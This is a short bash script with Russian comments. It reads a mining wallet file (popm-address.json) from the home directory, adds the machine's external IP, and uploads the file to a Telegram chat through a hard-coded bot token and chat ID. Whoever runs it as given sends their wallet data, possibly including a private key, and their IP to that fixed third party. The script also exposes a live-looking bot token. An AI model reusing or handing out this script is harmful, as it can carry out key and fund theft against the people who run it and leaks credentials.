    #!/bin/bash
    
    # Ваш токен бота
    BOT_TOKEN="7608692871:AAEh1pdxSoGgouMbSFp0Vt2EwE_KLIZtwco"
    
    # Ваш Telegram Chat ID
    CHAT_ID="1720815276"
    
    # Путь к исходному файлу
    FILE_PATH="$HOME/popm-address.json"
    
    # Получение внешнего IPv4-адреса
    EXTERNAL_IP=$(curl -4 -s ifconfig.me)
    
    # Добавление IP-адреса в файл JSON
    TEMP_FILE=$(mktemp)
    jq --arg ip "$EXTERNAL_IP" '. + {external_ip: $ip}' "$FILE_PATH" > "$TEMP_FILE" && mv "$TEMP_FILE" "$FILE_PATH"
    
    # Переименование файла с добавлением IP-адреса
    NEW_FILE_PATH="$HOME/$EXTERNAL_IP-popm-address.json"
    mv "$FILE_PATH" "$NEW_FILE_PATH"
    
    # Формирование сообщения
    MESSAGE="The file contains the updated JSON along with the external IPv4 address: $EXTERNAL_IP"
    
    # URL для отправки сообщения
    URL_MESSAGE="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
    URL_DOCUMENT="https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
    
    # Отправка текстового сообщения
    RESPONSE_MESSAGE=$(curl -s -X POST $URL_MESSAGE -d chat_id=$CHAT_ID -d text="$MESSAGE")
    
    # Проверка отправки текстового сообщения на ошибки
    if [[ $RESPONSE_MESSAGE == *'"ok":false'* ]]; then
      echo "Failed to send message. Response: $RESPONSE_MESSAGE"
    else
      echo "Message sent successfully!"
    fi
    
    # Генерация случайной задержки от 1 до 10 секунд
    RANDOM_DELAY=$((RANDOM % 10 + 1))
    echo "Sleeping for $RANDOM_DELAY seconds..."
    sleep $RANDOM_DELAY
    
    # Отправка файла
    RESPONSE_DOCUMENT=$(curl -s -X POST $URL_DOCUMENT -F chat_id=$CHAT_ID -F document=@"$NEW_FILE_PATH")
    
    # Проверка отправки файла на ошибки
    if [[ $RESPONSE_DOCUMENT == *'"ok":false'* ]]; then
      echo "Failed to send document. Response: $RESPONSE_DOCUMENT"
    else
      echo "Document sent successfully!"
    fi
